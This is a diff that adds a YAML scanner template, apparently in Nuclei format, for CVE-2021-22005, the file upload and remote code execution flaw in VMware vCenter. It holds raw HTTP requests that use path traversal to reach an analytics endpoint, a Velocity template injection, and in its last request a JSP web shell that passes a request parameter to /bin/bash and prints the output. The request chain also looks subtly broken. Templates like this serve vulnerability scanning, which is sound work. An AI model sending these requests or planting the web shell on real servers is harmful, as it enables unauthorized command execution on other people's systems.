@@ -1,0 +1,84 @@
+id: vmware-vcenter-file-upload-cve-2021-22005
+info:
+  name: VMware vCenter Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    VMware vCenter Server has an arbitrary file upload vulnerability, allowing attackers to upload specially crafted files through port 443 of VMware vCenter Server and execute arbitrary code on the server.
+  tags: fileupload,rce
+  reference:
+    - https://kb.vmware.com/s/article/85717
+    - https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee
+  classification:
+    cve-id: CVE-2021-22005
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+
+variables:
+  agent_name: '{{rand_text_alphanumeric(5)}}'
+
+http:
+  - raw:
+      - |
+        POST /analytics/telemetry/ph/api/hyper/send?_c&_i=test HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        test
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+
+  - raw:
+      - |
+        POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c={{agent_name}}&_i=test2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        X-Deployment-Secret: abc
+
+        {"manifestSpec":{},"objectType":"a2","collectionTriggerDataNeeded":true,"deploymentDataNeeded":true,"resultNeeded":true,"signalCollectionCompleted":true,"localManifestPath":"a7","localPayloadPath":"a8","localObfuscationMapPath":"a9"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c={{agent_name}}&_i=test2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        X-Deployment-Secret: abc
+
+        {"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n<request>\n<query name=\"vir:VCenter\">\n<constraint>\n<targetType>ServiceInstance</targetType>\n</constraint>\n<propertySpec>\n<propertyNames>content.about.instanceUuid</propertyNames>\n<propertyNames>content.about.osType</propertyNames>\n<propertyNames>content.about.build</propertyNames>\n<propertyNames>content.about.version</propertyNames>\n</propertySpec>\n</query>\n</request>\n<cdfMapping>\n<indepedentResultsMapping>\n<resultSetMappings>\n<entry>\n<key>vir:VCenter</key>\n<value>\n<value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n<resourceItemToJsonLdMapping>\n\n<forType>ServiceInstance</forType>\n<mappingCode><![CDATA[\n#set($a = $GLOBAL-logger)##\n]]></mappingCode>\n</resourceItemToJsonLdMapping>\n</value>\n</value>\n</entry>\n</resultSetMappings>\n</indepedentResultsMapping>\n</cdfMapping>\n<requestSchedules>\n<schedule interval=\"1h\">\n<queries>\n<query>vir:VCenter</query>\n</queries>\n</schedule>\n</requestSchedules>\n</manifest>", "objectId": "a2"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ServiceInstance"
+          - "content.about.version"
+
+  - raw:
+      - |
+        POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c={{agent_name}}&_i=test2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        X-Deployment-Secret: abc
+
+        <% out.println("<999999999999999999999999999>");String[] c = {"/bin/bash","-c",request.getParameter("vulgo")};java.io.InputStream in = Runtime.getRuntime().exec(c).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}out.println("<999999999999999999999999999/>");%>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<999999999999999999999999999>"
+          - "<999999999999999999999999999/>"
